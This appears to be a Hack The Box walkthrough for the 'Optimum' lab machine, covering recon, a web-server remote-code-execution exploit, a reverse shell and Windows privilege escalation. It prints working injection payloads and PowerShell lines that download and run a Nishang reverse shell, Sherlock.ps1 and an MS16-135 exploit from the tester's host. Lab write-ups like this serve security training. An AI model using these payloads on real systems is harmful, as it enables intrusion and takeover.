# Optimum Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA optimum 10.10.10.8``

# ${{\color{purple}Initial Foothold}}\ $

### During the web recon I found the version of the cms that is vulnerable to an RCE **:white_check_mark:**

![image](https://user-images.githubusercontent.com/123066149/219492265-45d0a04b-eee5-4467-be6a-b33f8a38eac9.png)


![image](https://user-images.githubusercontent.com/123066149/219492157-283f6b64-491f-48ff-8fa7-a6f770c0047f.png)


### I used this exploit in the first place :

https://www.exploit-db.com/exploits/49584


![image](https://user-images.githubusercontent.com/123066149/219492915-e653e5a7-f220-41b2-89de-59e80f4e45c8.png)


# ${{\color{purple}Exploitation}}\ $ 

### In a second time I exploited the vulnerability with Burp :

``%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.10.16.5.}``


![optimum](https://user-images.githubusercontent.com/123066149/219493247-c0c21ced-4cd1-4b24-8980-c815c2e7262b.PNG)


![optimum2](https://user-images.githubusercontent.com/123066149/219493268-de16367a-282b-4e33-8fd4-3dc80e7e8fdf.PNG)


``%00{.exec|c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http://10.10.16.5:80/Nishangrev.ps1').}``

![optimum3](https://user-images.githubusercontent.com/123066149/219493604-977a134f-f22e-4aec-af01-cc72923d0390.PNG)


``IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Nishangrev.ps1')``


![optimum4](https://user-images.githubusercontent.com/123066149/219493617-ebd94c1f-597f-4e69-b246-5173dae68d41.PNG)


# ${{\color{purple}Privilege Escalation}}\ $

``grep -i function Sherlock.ps1``


![optimum5](https://user-images.githubusercontent.com/123066149/219495828-a224e6fb-3c3c-453b-acd5-52f3a9d282b7.PNG)


### Add the Find-AllVulns function of Sherlokcs at the of the script :


![optimum6](https://user-images.githubusercontent.com/123066149/219495848-d65729e6-c5a8-4ba1-b9be-75bebec3b0d0.PNG)


``IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Sherlock.ps1')``


![optimum7](https://user-images.githubusercontent.com/123066149/219495875-efce0c42-0a1e-4084-84fe-70ccf3ef2e3f.PNG)


![image](https://user-images.githubusercontent.com/123066149/219494525-8a507ea7-2543-4af2-83ba-a2802c10a443.png)


``IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/MS16-135.ps1')``


![optimum8](https://user-images.githubusercontent.com/123066149/219494679-fcd46daf-5076-4ef9-b548-ef0481f50ab3.PNG)


# ${{\color{purple}Points of Improvement}}\ $

* Know the full path of powershell :
* ``c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe``
* Use ``Sherlock.ps1`` for privileges escalations on windows
